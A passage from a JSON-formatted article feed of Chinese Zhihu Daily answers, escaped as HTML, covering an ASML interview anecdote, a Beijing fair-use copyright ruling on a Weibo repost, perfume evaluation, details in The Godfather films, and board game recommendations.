的现状？聊聊我的使用场景和思考</a></li>\n<li><a href=\"https://sspai.com/post/67520\" target=\"_blank\">iOS / iPadOS 15 公测版来了，哪些新功能值得尝鲜？</a></li>\n<li><a href=\"https://sspai.com/post/67512\" target=\"_blank\">熟悉的听感、又略有不同，千元级无线降噪音乐耳机：Beats Studio Buds 体验</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67556"},{"title":"人在逆境的时候该怎么调整自己状态？","date":"2021-07-04 23:08:17","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-f04d65ed0008119f42f578e3957a23a2_l.jpg?source=8673f162\"><span>墨子连山，</span><span>干货在这不受待见，我把他们放在同名公众号了……</span>\n<a href=\"https://www.zhihu.com/question/304993806/answer/1354895692\" hidden>阅读原文</a>\n</div>\n<div>\n<p>当年去 ASML 面试，对，就是荷兰生产光刻机的，现在还卡着我们脖子那个，总部在埃因霍温。</p>\n<p>当时的课题是解决激光头移动最优路径的问题，这是个背包问题，特点是复杂度随着路径的增加呈几何级数增加……说叉了，装 13 装习惯了，抱歉。总之就是各种测试之后，最后的面谈中，那个项目负责人结束前问了我一个问题：如果你手上的工作遇到困难，进展不下去了，你怎么办？</p>\n<p>我看他那个样子，显然就是例行公事，赶紧随便问完最后一个问题，恨不得我嘴皮子一停，他就马上起来握手了。因为之前已经经历了一周的测试，我的表现还是比较突出的，因为毕设项目就是演化算法相关，我的导师还是这个领域最权威杂志的主编，所以……抱歉，又说叉了，我今后要改掉这个恶习。</p>\n<p>总之我那时有点飘了，于是就打算给他来点有意思的。我说：我永远不会让自己手里只有一项工作，所以，如果一项工作遇到困难进展不下去，我会开始另一项工作，直到这项工作出现转机。</p>\n<p>当时那大哥脸就变了，荷兰人这点很好，什么情绪都写在脸上，眼睛都放光。总之，他说这是他听到过的最让人印象深刻的回答，当然我也被顺利录取了。后来因为种种原因我选择了回国，走之前还跟大哥通了个电话，他还记着这事。</p>\n<p>当时我只是突发奇想，秀了一下，但是事后我还真的仔细回味了一下这个回答，才发现为什么他有那么大的魅力，甚至自己当时都没想这么深。</p>\n<p>你们应该猜出来我想说什么了吧？人在逆境的时候应该怎么调节自己？答案应该是，人就不应该陷入逆境，永远不应该把你的希望只寄托在一件事物上，大白话就是，鸡蛋永远不能放在一个篮子里。</p>\n<p>试想，一个人至少有父母、有爱人、有子女、有工作、有学业、有个人爱好、可能还有副业……这些不大可能在同一时间都陷入逆境吧？工作逆境了可以转移到家庭、与父母相处逆境了可以转移到子女、学业逆境了可以转移到爱好，等等等等。一般人，一辈子都不会遇到同时在所有方面都遇到逆境的情况。</p>\n<p>为什么这个答案让那位大哥印象深刻呢？因为人都有认知盲区，走到死胡同里就会认为那是唯一一条路，哪怕两边根本没有墙你的眼睛都看不到，因为你的认知里面有墙，你根本就不会去看。</p>\n<p>最后，再次明确一下我的回答，人在逆境中怎么办？答，不要一棵树上吊死，抬头看看，树有的是，我们生活在森林里。</p>\n<p> </p>\n<p>补充 0:我当年是做建模的，光刻机的核心是工艺，材料工艺、运输工艺、装配工艺、生产工艺等等，什么叫工艺？就是一堆一堆的小细节，根本不是几个人的问题，人家就算告诉你标准，你都做不到。为什么 ASML 能做到？因为那就不是一个公司，那几乎是世界上所有最高工艺的集合体，他不属于荷兰，他只是生产线设在了荷兰而已。里面工作的有好多德国人、美国人、当然中国人也不少，但基本都是在做算法建模这些，听着高大上，但实际上都是边角余料，真正牛的是车间里那批技术人员，那里面好像一个中国人都没有，他们应该是不敢放我们的人。我参观的时候，他们介绍的核心部件是那个透镜，就是把激光束汇聚到芯片上做烧结用的。外观看起来就是个大圆桶，里面不让看，是德国卡尔蔡司生产的，据说只有他和日本一家能生产。这东西从德国运到荷兰，用的运输车也是特制的，我没见过车什么样，说是只有那个车能运，为什么？因为这玩意太精密，稍微晃一晃就完蛋，所以这个车有各种变态参数，但即便是特制的运输车，仍然不能轻易加速、不能轻易刹车、转弯都得慢慢来，如果我国自己搞，别说车，连司机都得从头培养，这就是工艺。所以，不是我不想，但研究光刻机这事确实我连边都沾不上。大家就别围观这事了，洗洗睡吧。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/304993806\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737651"},{"title":"你们在判决书上用过或看过哪些神来之笔？","date":"2021-07-04 23:08:13","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-83b18ed0e268ff1acf204ebacb527f10_l.jpg?source=8673f162\"><span>Three诗睿，</span><span>法律人，摄影痴，书籍癖。</span>\n<a href=\"https://www.zhihu.com/question/266083406/answer/313324421\" hidden>阅读原文</a>\n</div>\n<div>\n<p>关于司法实践难题”著作权合理使用“的：张海峡与于建嵘侵害著作权纠纷相关判决书。</p>\n<p>我们知道，著作权中的合理使用制度一直是司法实践中的难题，法律规定滞后于科技的发展，如何界定和调节权利的边界，在作品的创作者、传播者和社会公众之间落实利益平衡是理论界和实务界不断讨论的话题，本文仅以张海峡与于建嵘著作权纠纷相关判决书来聊一下著作权合理使用，虽则为一家之言，然而判决书再一次证明了一件事宜：科技倒逼法律前行。</p>\n<ul>\n<li>北京市第二中级人民法院（2012）二中民初字第 611 号民事判决</li>\n<li>北京市高级人民法院（2012）高民终字第 3452 号民事判决</li>\n</ul>\n<p>该案原告张海峡，当年是国内司考辅导专家。被告于建嵘则是社科院学者，微博大 V。2011 年 8 月 23 日，微博用户“巴黎观察”上传了张海峡关于评价留法女大学生言论的教学视频（视频名为：2011 张海峡·商经），在该视频中张海峡声称“凡是中国大陆的女孩子到法国留学的，回来之后都烂得一塌糊涂，都是超级潘金莲”。该微博经过于建嵘转发并评论后被众多的网友追捧。</p>\n<p>后张海峡向北京二中院起诉，称上述于建嵘在微博转载其讲课内容视频的行为侵犯了张海峡对涉案作品享有的发表权和信息网络传播权，要求于建嵘赔礼道歉并赔偿损失。</p>\n<p>该案历经一审判定于建嵘转发视频的行为构成合理使用，驳回张海峡全部诉讼请求，到北京高院驳回上诉，维持原判。笔者截取（2012）二中民初字第 611 号和（2012）高民终字第 3452 号民事判决之部分，个人认为北京二中院和高院对合理使用部分的说理颇为惊艳：</p>\n<hr>\n<p>北京二中院（2012）二中民初字第 611 号民事判决部分：</p>\n<blockquote>本案中，涉案口述作品已经发表，于建嵘的涉案转发行为的目的在于评论“巴黎观察”及张海峡的观点，属于以其言论表达其观点的行为，但表达个人观点不得侵害他人的合法权利；同时，法律允许对于他人作品进行合理使用，此时作品的权利人不得阻止他人的合理使用行为。涉案口述作品为司法考试的授课内容，其使用为课堂教学等，在正常情况下学习该内容者不会去于建嵘的博客中寻找涉案口述作品，而网民访问于建嵘涉案博文的正常目的在于关注各方的观点，而非涉案口述作品中与各方观点无涉的司法考试内容，故于建嵘的转发行为亦不会不合理地损害张海峡的合法权益。因此，于建嵘的转发行为构成合理使用，并未侵犯张海峡对涉案口述作品享有的信息网络传播权。</blockquote>\n<p>北京高院（2012）高民终字第 3452 号民事判决部分：</p>\n<blockquote>合理使用制度是著作权法律制度中的一项重要内容，其体现了著作权法保护作者和其他著作权人的利益与促进知识与信息广泛传播的双重目的，为了在著作权的排他性与自由表达之间寻求一种平衡。《著作权法》第二十二条规定了合理使用的 12 种情形，同时，《著作权法实施条例》第二十一条规定了上述 12 种合理使用构成的条件，但随着计算机和通信技术的发展，网络等新兴信息传播方式使得上述 12 种情形已经不能解决现实中出现的情况。因此，原审法院从本案的具体情况出发，在遵循《著作权法实施条例》第二十一条规定的合理使用构成条件的基础上，采用合理使用的一般原理对本案被诉行为是否构成合理使用进行评述，符合司法精神和合理使用制度的设置目的。张海峡有关原审判决没有将本案被诉行为与《著作权法》第二十二条的规定对号说明，属适用法律不明的上诉理由，不能成立，本院不予支持。<br><br>构成合理使用的被使用作品是已经发表的作品，且该使用不得影响该作品的正常使用，也不得不合理地损害著作权人的合法权益。<strong>如前所述，涉案作品在被诉行为发生前已经发表，于建嵘实施被诉行为的目的是为了评论“巴黎观察”的微博及张海峡的观点，为使评论更具针对性，于建嵘在评论他人微博的同时对他人包含涉案作品的微博进行了转发，该行为符合微博这一社交方式的惯例。而且，正是基于被诉行为的上述特点，使得网民更关注于各方的观点而非涉案作品中与各方观点无关的司法考试的内容。因此，于建嵘的被诉行为不会与张海峡对其涉案作品所行使的权利展开经济竞争，并未影响该作品的正常使用，也不会不合理地损害张海峡的合法权益。</strong>原审法院认定于建嵘的转发行为构成合理使用，并未侵犯张海峡对涉案作品享有的信息网络传播权是正确的。张海峡有关于建嵘的涉案行为不构成合理使用的上诉理由，缺乏事实及法律依据，本院不予支持。</blockquote>\n<hr>\n<p>就本案而言，涉及到一个问题就是，合理使用制度应当如何在著作权的排他性与自由表达之间寻求平衡。</p>\n<p>我们知道，构成合理使用的被使用作品是已经发表的作品，且该使用不得影响该作品的正常使用，也不得不合理地损害著作权人的合法权益。</p>\n<p>那么于建嵘转发并评论“巴黎观察”包含涉案作品微博的行为是否会影响作品的正常使用，同时损害著作权人的合法权益？</p>\n<p>如果仅仅从现有的《著作权法》以及实施条例等补充规定来看，我国对于合理使用制度无疑是采用“有限穷尽列举”方式的（参见《著作权法》第二十二条），因为现有法律滞后于网络技术的发展，如果仅仅基于著作权侵权认定的无过错归责责任原则，则没有合理使用的抗辩将令被告于建嵘败诉，然而这必然不符合微博作为社交媒体空间的行为惯例，有碍公民言论的自由表达，同时也有违著作权法的立法精神和目的。</p>\n<p>故而北京二中院在著作权法规定的合理使用构成条件的基础上，为平衡著作权的排他性与自由表达推理为：涉案口述作品已经发表，于建嵘的涉案转发行为的目的在于评论“巴黎观察”及张海峡的观点，属于以其言论表达其观点的行为。而网民访问于建嵘涉案博文的正常目的在于关注各方的观点，而非涉案口述作品中与各方观点无涉的司法考试内容，故于建嵘的转发行为亦不会不合理地损害张海峡的合法权益。</p>\n<p>北京高院则肯定上述一审法院的做法，认为其符合司法精神和合理使用制度设置目的。并进一步调整补充，于建嵘的被诉行为不会与张海峡对其涉案作品所行使的权利展开经济竞争，并未影响该作品的正常使用，也不会不合理地损害张海峡的合法权益。</p>\n<hr>\n<p>推动这两个判决的原因在于，包括著作权在内的现代知识产权制度的本质即为公共政策的产物，而知识产权的边界从来就是随着时代的脉搏而搏动，跟随潮流而进的，著作权的合理使用正是界定和调节知识产权边界的重要手段，是在作品的创作者、传播者和社会公众之间落实利益平衡原则的重要方式。</p>\n<p>因而这个张海峡与于建嵘著作权纠纷的一二审判决书颇有现实意义：一是为我国后续修改著作权法提供参考，二是为解决现实中关于合理使用制度的司法实践难题提供指导，一定意义上解决了司法实践面临的尴尬。</p>\n<p>参考资料：</p>\n<p>1.<a href=\"http://link.zhihu.com/?target=http%3A//www.chinaipmagazine.com/Topics/InfoShow.asp%3F11-384.html\" target=\"_blank\" rel=\"nofollow noreferrer\">张海峡诉于建嵘侵害著作权纠纷一审民事判决（2012）二中民初字第 00611 号</a>；</p>\n<p>2.<a href=\"http://link.zhihu.com/?target=https%3A//www.itslaw.com/detail%3FjudgementId%3D1018bc16-1c4a-43ea-8e80-ee942ced04a1%26area%3D1%26index%3D1%26sortType%3D1%26count%3D73%26conditions%3DsearchWord%252B%25E5%25BC%25A0%25E6%25B5%25B7%25E5%25B3%25A1%252B1%252B%25E5%25BC%25A0%25E6%25B5%25B7%25E5%25B3%25A1\" target=\"_blank\" rel=\"nofollow noreferrer\">张海峡与于建嵘侵害著作权纠纷上诉案（2012）高民终字第 3452 号</a>；</p>\n<p>3.《微博转发的著作权法边界》，张惠彬，载《图书馆学研究》2013 年 21 期；</p>\n<p>4.《论合理使用制度在微博著作权侵权案件中的适用》，蔡浩明 ，载《中国出版》2014 年 13 期；</p>\n<p>5.《知识产权典型案例评析》，袁杰 、张晓霞主编，知识产权出版社 2017 版，P283-P288。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/266083406\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737779"},{"title":"评价香水好坏的标准是什么？","date":"2021-07-04 23:08:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-eb66d2fba76633b6200a91166754a8ae_l.jpg?source=8673f162\"><span>ChubbyPillow，</span><span>肥宅快乐枕</span>\n<a href=\"https://www.zhihu.com/question/28207538/answer/1961656339\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这是一个好复杂好复杂的问题……而且涉及到很多没有办法量化出来的玄学……</p>\n<p>这样吧，我能想到的方式就只有一种，就是搬出我的主观客观香水评价坐标图：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-b78d9135c703de1e973e9796e1ea13ef_720w.jpg?source=8673f162\" alt=\"\"></figure><p>我在这里面总共画了九个圈，每个圈都有对应的一部分香水</p>\n<p>我一直坚信在闻香经验足够丰富的香友眼里，对于香水的评价可以分为主观和客观两种</p>\n<p><strong>主观其实讲起来很简单，就是好不好闻的问题，好闻就正值难闻就负值</strong></p>\n<p><strong>客观就是艺术价值和层次感怎么样，价值高就正值，毫无价值或者层次感极差就负值</strong></p>\n<p>对于香水的“客观评价”就涉及到一个标准的问题了，但是很遗憾我没有一个完全客观的定义</p>\n<p>反正我个人的定义里面基本就只牵扯到这几个，原创性、层次感和原料……</p>\n<p>那么我一个圈一个圈来解释吧。</p>\n<p>①是我觉得巨难闻但是竟然还挺独特的玩意儿，常见于 Zoologist 或者 BeauFort 这种掉 san 品牌，尤其是诸如 Panda 或者 1805 Tonnerre 这种要么绿得抽筋要么黑得发晕的诡异产品</p>\n<p>②是一大堆传奇老香，由于老香经常有奇奇怪怪的康乃馨 note，香辛调，还有我不太喜欢的异丁基喹啉，所以有一部分是在坐标系左边的，但是总的来说艺术价值基本都还挺高</p>\n<p>③是最最最常见的各种现代主流商业香（包括男女），各种千篇一律的广藿花果香，千篇一律的现代馥奇，但是你也不能说人家完全没有艺术价值，毕竟配方还是要略微修改的</p>\n<p>④是某些良心的商业香以及还算不错的入门 niche 所在的区域，典型如 Guerlain 和 Hermes/Chanel 等等，不论是用料上还是调香水平都还算不错。入门 niche 大概就是 SL 和 AG 这种。</p>\n<p>⑤是恰好戳中我口味的某些普通的 designer 和 niche，由于我本人特别喜欢柑橘和清新花香，所以基本上类似于 Acqua di Parma 或者 Diptyque 的小清新我都闻着很开心</p>\n<p>⑥是整个坐标系中的佼佼者，用料和调香都是史诗级别，我能想到的唯一几个牌子就是旧版的 Frederic Malle 以及 Serge Lutens 吊钟，其他的就零散分布在各种 designer 纯香精和 niche 里</p>\n<p>⑦是大部分极其廉价的名人香以及不知来路的香水，基本处于不仅抄袭还抄得很垃圾那种</p>\n<p>⑧是由于用料实在太差了或者太诡异了足以引起人不适的香水，但至少还稍稍努了点力去抄</p>\n<p>⑨是彻彻底底弃疗的香水，随便扔进去几个闻着还行的合成原料完事儿，抄都懒得抄</p>\n<p>（肯定有人会问第四象限的点是什么？那是所谓的 clone，没有艺术价值但好闻）</p>\n<hr>\n<p>然后再次正面回答题主的问题，决定了香水价值的最主要因素是什么？</p>\n<p>这个价值究竟是哪方面的价值？艺术价值还是金钱上的价值？后者的话那就是成本了，香水成本一般确实挺低的，但是也要看一个品牌够不够良心，AG 和 SL 最初定价都不贵，但还是天然玫瑰天然晚香玉唰唰往里加，所以即使平均下来成本不高，这个用料分还是得打高一点。</p>\n<p>艺术价值这个玩意儿就见仁见智了，但是这么多年过来大部分香水爱好者会有一套趋同的评分体系，大家都不太能说明白是什么，但是一个香水差大家就都同意它差。典型的就如 Gabrielle，F 网有成堆的 dislike 不是没理由的，平时多体面的一个牌子（选料也认真）搞出来这种糊成一团的玩意儿，就前调能看，中后调乱七八糟，这不失望才怪了。还有那个 Dip 的 Essences Insensees Tiare，这连清新都算不上清新的破玩意儿……</p>\n<p>香精怎么评价好坏？不好意思这事儿你可能要找 <a href=\"http://www.zhihu.com/people/29788fc19d2e55a7d9d7c042e06db1e5\">@吃菜事魔者</a> ，我对这玩意儿一无所知，能闻出来天然跟合成的区别就了不得了，还得评价天然的究竟哪种最好……那得买好多精油净油，还得是不同产区不同网站的才区别得出吧。这事儿除了 <a href=\"http://www.zhihu.com/people/29788fc19d2e55a7d9d7c042e06db1e5\">@吃菜事魔者</a> 以及我不认识的一些博主，好像也就只有 Steffen Arctander 能帮你了哈哈哈哈哈哈【苦笑</p>\n<p>总之我能够解释的差不多就只有这些了，本篇回答仅代表我个人看法不代表客观规律。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/28207538\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737687"},{"title":"电影《教父》中有哪些易被忽略却令人深思的小细节？","date":"2021-07-04 23:08:00","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-9fd08ef587fa9b37cdf61d32112f4633_l.jpg?source=8673f162\"><span>扎维耶小丑，</span><span>喜欢历史的摄影爱好者</span>\n<a href=\"https://www.zhihu.com/question/22920209/answer/1969616697\" hidden>阅读原文</a>\n</div>\n<div>\n<p>教父系列之所以称之为经典，有一部分原因就是导演科波拉对细节的构思和表现做到了极致，让观众每次重看都会有新的发现。原片限于时长，没法交代出所有的分支剧情，但很多答案就隐藏在分镜头中，观众可以细心观察，自己就能推理出来。</p>\n<p>比如下面几个初次观看会迷惑不解的问题。</p>\n<p><strong>细节 1：迈克尔为何要牺牲大将罗可去刺杀一个活不了几天的海门罗斯？(《教父 2》)</strong></p>\n<blockquote>先科普一下罗可：<br><br>罗可兰坡是迈克尔时代的两位家族角头之一。第一部里他为克莱门扎刺杀了出卖老教父的保利，因此得到了迈克尔的信任。在影片最后的大清洗中，罗可带着士兵成功刺杀了塔塔利亚，晋升为柯里昂家族的角头。<br><br>如果只看影片，观众可能会觉得罗可的晋升之路看起来太轻松了。普佐在小说中则对此进行了详细的解释。<br><br>早在成功刺杀保利之后，迈克尔就将罗可收为己用，命令他私下招募没有案底的士兵，作为自己的直属军团备用，泰西欧和克莱门扎都不知道这支秘密军队的存在。后来正是这支军队扑灭了五大家族的反击，为迈克尔彻底拿下了纽约战争的胜利。<br><br>到了教父二，罗可不但担任了角头，而且还成为了迈克尔的安全主管，职责类似于以前的克莱门扎。但正是这个职责最终让他丢掉了性命。</blockquote>\n<p>黑手党讲究的是高风险高回报。位子坐得越高，责任就越重，出了岔子就要负责到底。教父 2 里柯里昂家族一共出了三个背锅侠，他们每个都为自己的错误付出了代价。</p>\n<p>第一个是二哥弗雷多，这个最明显的了。当了叛徒就 GG 吧，亲哥也没用。</p>\n<p>第二个是汤姆哈根。他的错误是主事期间让凯溜出了庄园，导致迈克尔的孩子被流产。这个事对意大利人来说很严重，因此迈克尔当面羞辱了汤姆，并威胁将他踢出决策层。</p>\n<p>最后一个就是罗可了。罗可身为安全主管，却让迈克尔险些遭到刺杀，这是重大失职。第一部里老教父遭到刺杀，结果克莱门扎从头到尾被自己人怀疑，哪怕桑尼通过调查确认了克莱门扎没有嫌疑，但他依然被汤姆和迈克尔谨慎防范，直到泰西欧暴露了才洗清怀疑。罗可的资历远不如克莱门扎，却犯下了和克莱门扎同样的错误，其结果就可想而知了。</p>\n<p><strong>所以在迈克尔，汤姆和罗可的那场戏里，三个角色的台词目的性都很明显</strong>：</p>\n<p>汤姆先说刺杀海门罗斯是自杀式任务，难度高而且几乎没有回报，建议迈克尔不要这么做。这是身为军师的正常建议。</p>\n<p>迈克尔立刻说你是不是想跑，养情妇还准备搬家，这是几个意思？迈克开始借题敲打汤姆。</p>\n<p><strong>此时镜头给到罗可</strong>，这个细节暗示了是罗可私下调查的汤姆。罗可这么做的目的很明显，就是借此自效，向迈克尔表达忠诚。</p>\n<p>然而迈克尔当着罗可的面羞辱汤姆，传达的信号也很明显：你给我的情报我已经当面告诉汤姆了，以后你在家族是混不下去了。</p>\n<p>罗可此时面无表情。他已经知道迈克尔要让他为自己的失职付出代价了。</p>\n<p>迈克尔问了一句：罗可？</p>\n<p>意思是自杀式任务你去不去？</p>\n<p>罗可回答：很难，但不是不可能。</p>\n<p>意思是我愿意去。但这个任务很难，我要丰厚的报酬。</p>\n<p>迈克尔：很好。</p>\n<p>意思是你放心的去吧，汝妻子我养之。</p>\n<p>看看，这就是导演的功力。</p>\n<p>短短的几句台词就已经把罗可兰坡的命运交代清楚了。还顺带交代了迈克双线操作的优雅，突出了主人公的智略。不服不行。</p>\n<p><strong>细节 2：老教父是如何确定巴西尼是幕后主使的？</strong></p>\n<blockquote>先说一下时代背景：<br><br>维托时代纽约的格局很简单，柯里昂家族一家独大，剩下四大家族的体量仅和泰西欧的势力相当，单独对抗柯里昂家族毫无胜算。四大家族里最强大的是巴西尼家族，他是老教父前任对手马里波萨的残余势力，能够存留下来完全倚仗维托的仁慈。<br><br>那么，巴西尼哪来的勇气去对抗柯里昂家族呢？<br><br>原因有两个。<br><br>一是毒品问题让柯里昂家族站到了所有黑帮的对立面，这是非常罕见的事情。五十年代毒品在美国还没像今天这么泛滥，谁能率先让毒品流通起来，谁就掌握了未来的摇钱树。混黑社会就是为了求财，维托的立场等于断了所有人的财路，所以巴西尼才有机会把原来附庸在柯里昂胯下的小家族们拉拢过来。<br><br>二是桑尼的死大大鼓舞了巴西尼一方的士气。<br><br>桑尼在小说中并不像电影所描述得那么酱油。他从任何方面来讲都是一个合格的教父接班人。他曾亲自带队把五大家族揍得跪地求饶，五大家族都对桑尼忌惮不亚于老教父本人。在外人看来，教父的统治基础有两个：一个是卢卡布拉西，一个是桑尼柯里昂。如今这两个人都已经死了，柯里昂家族已经不可避免地陷入衰败了，现在正是出手的最佳时机。</blockquote>\n<p>所以老教父在出席会议之前就已经确定了两个信息：</p>\n<p>第一是塔塔利亚绝没有胆量单独对抗柯里昂家族。真正的幕后黑手是巴西尼，史特拉齐，克里安诺三人中的一个。</p>\n<p>第二是桑尼的死必有内鬼。哪怕是巴西尼，在没有内应的情况下也无法干掉桑尼。</p>\n<p>而在会议过程中，教父又观察到了三点：</p>\n<p>一是塔塔利亚始终旁若无人地对着巴西尼说话。比如“Yes,Don Barzini.<strong>He</strong> s too modest。<strong>He</strong> had all the judges and politicians in his pocket，<strong>He</strong> refused to share them。”他对巴西尼使用的是第二人称，对老教父使用的是第三人称。这种旁观者视角暴露了他和巴西尼走得更近。老教父由此再次确定了塔塔利亚并非主谋，他仅仅是个跟班而已。</p>\n<p>二是巴西尼全程以“其他家族总代言人”的语气说话。最明显的是这句：“那么我们就这样达成协议：毒品生意可以做，但是要有限制。柯里昂阁下来提供东部(地区)的保护，我们来提供和平”。巴西尼以“我们”自称，已经自认了反柯里昂联盟盟主的身份。</p>\n<p>三是史特拉齐和克里安诺全程未发一言。可见这两个人既不是领导，也没有站队。(影片的最后这两人也被迈克尔干掉了。这是科波拉为了电影效果而进行的艺术加工。在小说里，这两人没有遭到柯里昂家族的清洗，在战争后期反而协助柯里昂家族围剿巴西尼。小说里的情节更符合他们在会议上的表现)</p>\n<p>由此，老教父可以确认巴西尼就是幕后黑手，塔塔利亚是炮灰，史特拉齐和克里安诺倾向巴西尼，但眼下还处在观望中。</p>\n<p><strong>细节 3：威胁电影大亨的桥段有何寓意？</strong></p>\n<p>“斩马头”是第一部的经典桥段，也是原著里的重要情节。这段戏的作用除了突出老教父手眼通天的手段外，还是整个教父系列柯里昂家族转型的暗线。</p>\n<p>众所周知，迈克尔在清理了五大家族之后便举家搬去了内华达，将林荫道的老宅作为奖励留给了克莱门扎家族。那迈克尔为何会放弃“祖传”的橄榄油行业而甘愿去沙漠里啃沙子呢？</p>\n<p>原因就在汤姆带回来的情报上。</p>\n<p>制片人沃尔特和汤姆一共交流了两次。第一次直接把汤姆骂跑，第二次吃饭吃了一半又把汤姆骂跑了。汤姆把事情经过反馈给老教父，老教父由此得出一个结论：<strong>一个轻易把威胁挂在嘴边的人，一定不会是个高水平的人。在没有利益冲突的情况下使用威胁手段是多么地愚蠢而肤浅。如果这样的人都能在电影界呼风唤雨，那么柯里昂家族还有什么理由不进军电影界呢？</strong></p>\n<p>当时已经是 50 年代，橄榄油生意的利润越来越少，柯里昂家族面临着转型。旅游业，赌博业，色情业都是不错的方向。老教父投资莫格林就是其中的一次尝试。到了迈克尔时代，家族陷入内忧外患，迈克尔必须一边清除对手一边为家族寻找新的财路。这才有了迁居内华达的计划。</p>\n<p>电影限于篇幅，选择性地忽视了迈克尔在经济方面重振家族的努力。实际上，迈克尔在电影界最大的投资正是引出斩马头事件的强尼方亭。他通过方亭控制了电影市场，并且拿到了奥斯卡奖，使柯里昂家族一跃成为电影行业的龙头之一。</p>\n<p>强尼方亭是老教父的教子。他的成功才是电影标题的真正含义。这就是斩马头这一桥段隐含的剧情作用。</p>\n<p><strong>细节 4：迈克尔选择执行者的艺术。</strong></p>\n<blockquote>迈克尔的谋略是全剧天花板，他在选择执行者方面是有讲究的。</blockquote>\n<p>下面挨个列举一下：</p>\n<p>派克莱门扎去除掉卡洛，是因为前者是桑尼的教父，比其他人更痛恨害死桑尼的叛徒。</p>\n<p>派阿尔奈利去刺杀巴西尼，因为奈利本身就是警察，他的警徽和警号都是真实的，巴西尼无法防备。</p>\n<p>派泰西欧去刺杀莫格林，是因为迈克在执行清洗行动前不想把叛徒留在身边以免节外生枝。</p>\n<p>派威利奇契去控制泰西欧，是因为威利是克莱门扎的高级士兵，不听从泰西欧的命令。</p>\n<p>派尼克杰拉奇去杀死泰西欧，是因为尼克是泰西欧的养子和头号士兵，必须重新向柯里昂家族递交投名状。</p>\n<p>派罗可去执行自杀式任务是因为罗可没能保护好迈克。</p>\n<p>第三部里杀死鲁西加的杀手是第一部里迈克尔在西西里的保镖卡罗。他是汤马西诺的老部下，有为主报仇的主观诉求。</p>\n<p>派阿尔奈利去刺杀大主教是因为大主教必须死。整个三部曲看下来，敢当面耍迈克尔的人都死了。除了那个逗比议员。</p>\n<p>以上。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/22920209\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737740"},{"title":"有哪些设定上非常吸引人的桌游推荐？","date":"2021-07-04 23:07:55","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a26fa649cbe65e25e3dbe1a8d40fa713_l.jpg?source=8673f162\"><span>Tuttiii，</span><span>HKU艺术史系，NYU艺术管理。电子+桌面游戏爱好者。</span>\n<a href=\"https://www.zhihu.com/question/265606673/answer/312899180\" hidden>阅读原文</a>\n</div>\n<div>\n<p>设定很酷的桌游不胜枚举，这里详细介绍两款个人非常喜欢、玩家也好评不断的桌游，再简单推荐一些我玩过的很有创意的游戏，希望能有价值。</p>\n<p><strong>《深海谍影 Captain Sonar》,2-8 人</strong></p>\n<p>一款很像小时候玩的海战棋的游戏，配件华丽丽升级，加入了多种元素、角色。规则不算复杂，玩起来趣味十足，既有个人策略又充满了互动和沟通。</p>\n<p>玩法简介：玩家根据游戏人数分为两队，每个队控制一艘潜水艇，每个队伍有四个角色分别负责不同的任务——船长、大副、工程师、监听员。两艘潜水艇的初始位置是不告诉对方的，在游戏过程中，玩家们需要通过监听员听到的情报，判断出对方潜水艇的位置，再通过大副准备的武器来攻击对方。船长负责己方潜艇的行进路线，工程师负责修复船体的损伤。</p>\n<p>游戏分为回合制和即时制两种模式，新手推荐先玩回合制熟悉游戏流程和技能，玩熟后再尝试即时制，更加紧张刺激。</p>\n<p>吸引人的特点：</p>\n<p>l 两块超长的挡板：用来遮挡两方玩家视线以防作弊，上面有精致的插画，横置在桌上很吸睛</p>\n<p>l 慷慨激昂的游戏过程：玩家在游戏过程中会扮演各种角色，说出各种口令，非常有代入感</p>\n<p>l 紧张刺激的游戏体验：玩家需要不断猜测对方的位置，又要时刻担心自己是否暴露，当己方的鱼雷炸到对方潜艇时的快感简直棒极了</p>\n<p>l 有趣的侦测系统：双方潜艇都有两个特别的侦测系统，十分考验玩家的推理能力，还有一点点尔虞我诈的成分</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ccc9444b92679e70616b0e47760c0a00_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-dd9866737ca58b0bc16f1113a2ad9133_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-6bd63c9c939a1acb6230615b62e24e23_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>《时间守望 TIME Stories》，2-4 人</strong></p>\n<p>一款集优秀的美工、机制、剧情为一体的解谜探险游戏，极简、未来风格的封面和版图非常符合它的游戏背景：未来世界的时间穿越特工，乘坐时间穿梭机回到过去完成组织的任务。</p>\n<p>游戏模式是合作类，每个扩都是一个新剧本，有不同的主题（甚至画风都会跟着主题变化），玩家要通过探索剧情、步步解谜，做出各种各样的选择，与 NPC 和怪物斗智斗勇，最终完成任务。</p>\n<p>吸引人的特点：</p>\n<p>l 超良心的美工，绝对的“高颜值”：版图和封面是未来极简风，白色为基调，高级感十足；每个剧本会根据内容搭配合适的插画风格，比如僵尸背景就用了美漫风，非常细心</p>\n<p>l 简单的游戏流程，极易上手，新人友好</p>\n<p>l 体验感、代入感极强，又不失策略</p>\n<p>l 